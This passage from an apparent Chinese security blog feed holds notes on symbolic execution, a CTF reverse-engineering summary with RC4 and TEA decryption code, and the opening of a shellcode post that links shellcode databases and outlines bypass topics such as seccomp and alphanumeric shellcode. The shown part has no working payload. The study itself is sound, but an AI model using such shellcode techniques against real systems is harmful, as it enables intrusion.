<li>简单声明语句、无条件跳转语句和变量操作语句，只是将程序中的具体值替换为了符号</li>
<li>而if条件语句中，将具体值替换为了符号，所以我们无法判断if语句中的真值，就不能确定条件分支的走向，这是符号执行技术对程序执行语义的最大改变，也是符号执行与具体执行的关键区别</li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>程序执行状态</strong></p>
<ul>
<li>PC
<ol type="1">
<li>为了解决“分支走向不确定”的问题，King为程序状态新添加了一个变量：<strong>路径约束条件
pc(path
constraint)</strong>，在每个if条件语句处并没有实际决定程序执行哪个分支，这就需要符号执行引擎<strong>主动选择执行分支</strong>并<strong>记录整个执行过程</strong>，pc就辅助完成了这项工作</li>
<li>Simply，pc就是符号执行过程中对路径上条件分支走向的选择情况</li>
<li>来看一段示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
<li>假设上述三个分支中选择了if1:true if2:true
if3:false，pc表示为<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>，由此可见，pc是一个bool表达式</li>
</ol></li>
<li>符号执行引擎
<ul>
<li>当符号执行到 if(q) 时，pc 有可能包含q（1），也可能包含
~q（2），如果符号执行引擎选择进入then分支，则 pc
表现为（1）的形式，如果符号执行引擎选择进入else分支， 则 pc
表现为（2）的形式</li>
<li>而我们希望两条分支都被测试，所以符号执行引擎执行到if条件语句时，符号执行需要创建两个“并行”的执行过程</li>
<li>每个和符号变量相关的if条件语句都会为pc贡献一个决定程序执行走向的表达式，最后要确定pc对应路径的程序输入参数，只需要用约束求解器对pc进行求解</li>
</ul></li>
</ul></li>
<li><p><strong>符号执行树</strong></p>
<ol type="1">
<li>定义：用来描述程序执行路径的树形结构</li>
<li>内容：一个节点对应程序中的一条语句，还可以包含指令计数、PC、变量值等程序执行状态信息(没找到合适的图，就先放一张不带C代码的)
<img
src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" /></li>
</ol></li>
<li><p><strong>约束求解</strong></p>
<ol type="1">
<li>定义：
<ol type="1">
<li>给定一个三元组&lt;V,D,C&gt;,其中：
<ol type="1">
<li>V: 变量的有限集合<br />
</li>
<li>D: 变量的论域，变量可能取值的有限集合<br />
</li>
<li>C: 有限约束集合，某个约束关系<span
class="math inline">\(C_i\)</span>包含V中一个或多个变量，若<span
class="math inline">\(C_i\)</span>包含k个变量，则称其为在这k个变量集合上的k元约束<br />
</li>
</ol></li>
<li>约束求解就是找到约束问题的一个解，该解对变量集合中所有变量都赋一个取自其论域的值，并且这些变量的值满足该问题的所有约束条件<br />
</li>
<li>对于约束问题<span class="math inline">\(P =
&lt;V,D,C&gt;\)</span>，若P至少存在一个解，则称P为可满足的，否则称其为不可满足的<br />
</li>
</ol></li>
<li>分类:
<ol type="1">
<li>SAT(The Satisfiability problem, 可满足性问题)
<ol type="1">
<li>定义：求解由<strong>布尔变量集合</strong>所构成的布尔函数，是否存在变量的一种分布使得该函数的取值为1<br />
</li>
<li>缺陷：①只能解决命题逻辑公式问题，很多实际问题转化不成命题逻辑问题②必须用布尔变量来表示，将实际问题转化为布尔函数开销大，转换后的函数也极其复杂<br />
</li>
</ol></li>
<li>SMT(Satisfiability Modulo Theories, 可满足性模理论)
<ol type="1">
<li>定义：将SAT只能求解命题逻辑公式问题扩展为可以解决一阶逻辑所表达的公式。包含多种理论。
<ol type="1">
<li>什么是一阶逻辑</li>
</ol></li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>回到开始的函数</strong></p></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure>
<p>我们将其写为<em>类PL/1语言</em> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
<p>我们在调用<span
class="math inline">\(sum(1,2)\)</span>后，可以列一个表格来观察程序流<br />
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    2 &amp; 1 &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    3 &amp; 1 &amp; 2 &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    4 &amp; 1 &amp; 2 &amp; 3 &amp; 1 &amp; 2 &amp; true \cr \hline
\end{array}
\]</span> &gt; Line 5是return 3 (Katex不支持合并单元格，理解万岁)</p>
<p>我们在调用<span
class="math inline">\(sum(a1,a2)\)</span>后，就是把具体值换成了对应的符号
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    2 &amp; a1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    3 &amp; a1 &amp; a2 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    4 &amp; a1 &amp; a2 &amp; a3 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<blockquote>
<p>Line 5是return (a1+a2)</p>
</blockquote>
<p>既然符号执行与具体值执行最大的区别是if条件语句，那么我们写一个带有if语句的程序来看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
<p>这个函数转化为C就是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">power</span><span class="params">(<span class="type">int</span> X, <span class="type">int</span> Y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> Z = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> J = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们继续用表格的格式来看</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        2 &amp; 1 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        3 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<p>前三行都很正常，直到第五行进行判断<br />
1. 处理判断语句 <code>Y&gt;=J</code> 得到约束条件 <code>a2&gt;=1</code>
2. 生成两个分支的路径约束条件：<br />
- (a2&gt;=1) <span class="math inline">\(\subset\)</span> true -
~(a2&gt;=1) <span class="math inline">\(\subset\)</span> true 3.
两个路径约束都可满足，分别对两个路径进行探索</p>
<p>对于分支: ~(a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; ~(a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后马上在Line 12处得到(return 1 when a2&lt;1)，探索完成</p>
<p>对于分支: (a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        7 &amp; a1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        8 &amp; a1 &amp; 2 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后因为Line
9，程序会跳回第四行继续判断语句，会产生两个新的分支，就陷入了无限循环，这不是我们想要的。</p>
<p>可是循环在一个程序中经常出现，该怎么解决这一问题？我们接着往后看</p>
<h1 id="x01-动态符号执行技术dse">0x01 动态符号执行技术(DSE)</h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>以具体的数值作为输入，执行程序代码，在程序实际执行路径的基础上：
<ol type="1">
<li>用符号执行技术对路径进行分析</li>
<li>提取路径的约束表达式</li>
<li>根据路径搜索策略(深度、广度)对约束表达式进行变形</li>
<li>求解变形后的表达式并生成新的测试用例</li>
<li>不断迭代上述过程，直到完全遍历程序的所有执行路径</li>
</ol></li>
<li>DSE的出现是为了解决静态SE①执行效率低②系统开销大③误报率高的问题</li>
</ol></li>
<li><strong>实现细节(以函数为例)</strong>
<ol type="1">
<li>场景：<code>void func(int a,int b)</code>,调用<code>func(X,Y)</code></li>
<li>Step1: 生成一组随机输入，开始"实际执行"</li>
<li>Step2:
<strong>同时</strong>符号引擎开始符号执行，按照“实际执行”的“执行路径”上的分支条件语句的“谓词”，搜集所有符号约束条件及其对应真值</li>
<li>Step3:
根据收集到的符号约束条件，按照一定路径选择策略，构造出一条新的可行路径约束
<ul>
<li>举个例子：深度优先策略</li>
<li>如果<code>pc = p1 ∩ p2 ∩ p3</code>,
深度优先就是将最后一个谓词(对不起jo太郎😭离散没学好忘了这个p3叫啥了)取非，变为<code>p1 ∩ p2 ∩ ~p3</code></li>
</ul></li>
<li>Step4: 使用约束求解器求解出新约束集合对应的具体输入</li>
<li>Step5: 重复上述过程，直到遍历全部路径</li>
</ol></li>
<li><strong>DSE工具SAGE</strong>
<ol type="1">
<li>原理粗略地过了一遍，大段大段的看不懂😭这里就不花时间总结了</li>
<li>SAGE基于x86的机器码进行符号执行，原因如下：
<ol type="1">
<li>屏蔽不同编程语言、编译器及编译平台对分析过程的影响，具有更强的复用性</li>
<li>忽略编译器"代码优化""代码混淆""基本块转换"等使代码语义发生变化的操作，有利于确定程序实际存在的漏洞</li>
<li>闭源分析yyds</li>
</ol></li>
</ol></li>
<li><strong>关键问题</strong>
<ol type="1">
<li>外部函数调用</li>
<li>循环问题：路径爆炸</li>
</ol></li>
</ul>
<blockquote>
<p>这一段也不仔细读了...用到再学</p>
</blockquote>
<h1 id="x02-并行符号执行技术pse">0x02
<strong>并行符号执行技术(PSE)</strong></h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>很多情况下符号执行引擎无法继续运行的原因是内存不足，所以我们希望通过计算集群可无穷扩展的内存空间和CPU来缓解路径爆炸问题</li>
<li>分布式...这我就先不看了</li>
</ol></li>
</ul>
<h1 id="x03-参考文献">0x03 参考文献</h1>
<p>1《软件安全分析与应用》</p>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>REV - Crypto Knowledge Summary</title>
    <url>/2024/02/06/REV%20-%20Crypto%20Knowledge%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下逆向中有关密码学的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><p><a href="#1-stream-cipher">Stream Cipher</a></p>
<ul>
<li><a href="#1-1-rc4">1-1 RC4</a></li>
</ul></li>
<li><p><a href="#2-block-cipher">Block Cipher</a></p>
<ul>
<li><a href="#2-1-teaxteaxxtea">2-1 tea/xtea/xxtea</a></li>
</ul></li>
</ol>
<h1 id="stream-cipher">[1] Stream Cipher</h1>
<h2 id="rc4">[1-1] RC4</h2>
<h3 id="基本原理">[1-1-1] 基本原理</h3>
<p>加密: 明文与 keystream 异或得到密文</p>
<p>密文: 密文与 keystream 异或得到明文</p>
<p>keystream 与明文等长</p>
<p>由于 RC4 采取逐位异或的加密方式，只要我们知道了密文和key，只需要放到
cyberchef 里再加密一次就能得到原文</p>
<h3 id="生成密钥流keystream">[1-1-2] 生成密钥流（keystream）</h3>
<p>RC4 的密钥流生成由两部分组成：</p>
<ol type="1">
<li><p>KSA（the Key-Scheduling Algorithm）</p></li>
<li><p>PRGA（the Pseudo-Random Generation Algorithm）</p></li>
</ol>
<p><strong>KSA: 利用key生成S盒</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> T[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    Sbox[i] = i;</span><br><span class="line">    T[i] = key[ i % key_length ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">    j = (j + Sbox[i] + T[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>PRGA: 利用S盒生成密钥流</strong> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">    j = (j + Sbox[i]) % SBOX_LEN;</span><br><span class="line">    swap(&amp;Sbox[i], &amp;Sbox[j]);</span><br><span class="line">    t = (Sbox[i] + Sbox[j]) % SBOX_LEN;</span><br><span class="line">    puc_key_stream[k] = Sbox[t];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="完整代码">[1-1-3] 完整代码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBOX_LEN 256</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_encrypt rc4_crypt</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_decrypt rc4_crypt</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">swap_uchar</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_x, <span class="type">unsigned</span> <span class="type">char</span> *puc_y)</span></span><br><span class="line">&#123;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_y = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, puc_data[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用Key生成S盒</span></span><br><span class="line"><span class="comment"> * the Key-Scheduling Algorithm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_ksa</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key, <span class="type">int</span> key_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> tmp[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        puc_sbox[i] = i;</span><br><span class="line">        tmp[i] = puc_key[i % key_length];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        j = (j + puc_sbox[i] + tmp[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); <span class="comment">//交换puc_sbox[i]和puc_sbox[j]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用S盒生成密钥流</span></span><br><span class="line"><span class="comment"> * The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_prga</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">        j = (j + puc_sbox[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">        t = (puc_sbox[i] + puc_sbox[j]) % SBOX_LEN;</span><br><span class="line">        <span class="comment">/* 为了更清晰理解rc4算法流程，此处保存keystream，不直接进行XOR运算 */</span></span><br><span class="line">        puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 加解密 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 把PRGA算法放在加解密函数中可以不需要保存keystream */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ul_data_length; i++) &#123;</span><br><span class="line">        puc_data[i] ^= puc_key_stream[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sbox[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key[SBOX_LEN] = &#123;<span class="string">&quot;HeyGap&quot;</span>&#125;; <span class="comment">//秘钥内容随便定义</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">512</span>] = <span class="string">&quot;HeyGap&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> puc_keystream[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ul_data_length = <span class="built_in">strlen</span>(data);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s, length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data string:%s\n&quot;</span>, data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data hex:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成S-box */</span></span><br><span class="line">    rc4_ksa(sbox, (<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成keystream并保存,S-box也会被更改 */</span></span><br><span class="line">    rc4_prga(sbox, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S-box final status:\n&quot;</span>);</span><br><span class="line">    hexdump(sbox, <span class="keyword">sizeof</span>(sbox));</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key stream:\n&quot;</span>);</span><br><span class="line">    hexdump(puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 加密 */</span></span><br><span class="line">    rc4_encrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cipher hexdump:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 解密 */</span></span><br><span class="line">    rc4_decrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decypt data:%s\n&quot;</span>, data);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="block-cipher">[2] Block Cipher</h1>
<h2 id="teaxteaxxtea">[2-1] Tea/xTea/xxTea</h2>
<h3 id="tea-decrypt">[2-1-1] Tea decrypt</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">1234</span>,<span class="number">2341</span>,<span class="number">3412</span>,<span class="number">4123</span>&#125;;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> *encrypted)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> enc_tmp1 = encrypted[<span class="number">0</span>],enc_tmp2 = encrypted[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">        enc_tmp2 -= (sum + enc_tmp1) ^ (<span class="number">16</span> * enc_tmp1 + key[<span class="number">2</span>]) ^ (<span class="number">32</span> * enc_tmp1 + key[<span class="number">3</span>]);</span><br><span class="line">        enc_tmp1 -= (sum + enc_tmp2) ^ (<span class="number">16</span> * enc_tmp2 + key[<span class="number">0</span>]) ^ (<span class="number">32</span> * enc_tmp2 + key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    encrypted[<span class="number">0</span>] = enc_tmp1;</span><br><span class="line">    encrypted[<span class="number">1</span>] = enc_tmp2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> encflag[] = &#123;</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span> *)encflag+<span class="number">6</span>);</span><br><span class="line">    cout&lt;&lt;(<span class="type">char</span> *)encflag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="xtea-decrypt">[2-1-2] xTea decrypt</h3>
<h3 id="xxtea-decrypt">[2-1-3] xxTea decrypt</h3>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>REVERSE</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Shellcode Summary</title>
    <url>/2024/02/08/Pwn%20-%20Shellcode%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
Shellcode 也是十分核心的技术🤔
</blockquote>
<span id="more"></span>
<h1 id="manual">Manual</h1>
<p><a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">linux
系统调用号表</a></p>
<p><a href="https://docs.pwntools.com/en/stable/shellcraft.html">manual:
pwntools.shellcraft</a></p>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><a href="#1-编写-shellcode">编写 shellcode</a>
<ul>
<li><a href="#1-1-shellcode-板子">shellcode 板子</a></li>
<li><a href="#1-2-现有工具">现有工具</a></li>
<li><a href="#1-3-板子">板子</a></li>
</ul></li>
<li><a href="#2-shellcode-restrictions--bypass-限制与绕过">shellcode
restrictions &amp; bypass (限制与绕过)</a>
<ul>
<li><a href="#2-1-length-restrictions-长度约束">Length restrictions
(长度约束)</a></li>
<li><a href="#2-2-seccomp-禁用">seccomp 禁用</a></li>
<li><a href="#2-3-alphanumeric-shellcode-字母数字构成">alphanumeric
shellcode (字母+数字构成)</a></li>
</ul></li>
<li><a href="#3-例题">例题</a></li>
<li><a href="#4-参考资料">参考资料</a></li>
</ol>
<h1 id="编写-shellcode">[1] 编写 shellcode</h1>
<h2 id="shellcode-板子">[1-1] shellcode 板子</h2>
<ol type="1">
<li><p><a href="https://www.exploit-db.com/">exploit-db</a></p></li>
<li><p><a href="https://shell-storm.org/shellcode/index.html">Shellcodes
database for study cases(已停止更新)</a></p>
<ul>
<li>这个虽然停更了但是挺好用的，很适合找一些 length restrictions 的
shellcode</li>
</ul></li>
</ol>
<h2 id="现有工具">[1-2] 现有工具</h2>
<h3 id="pwntools">[1-2-1] Pwntools</h3>
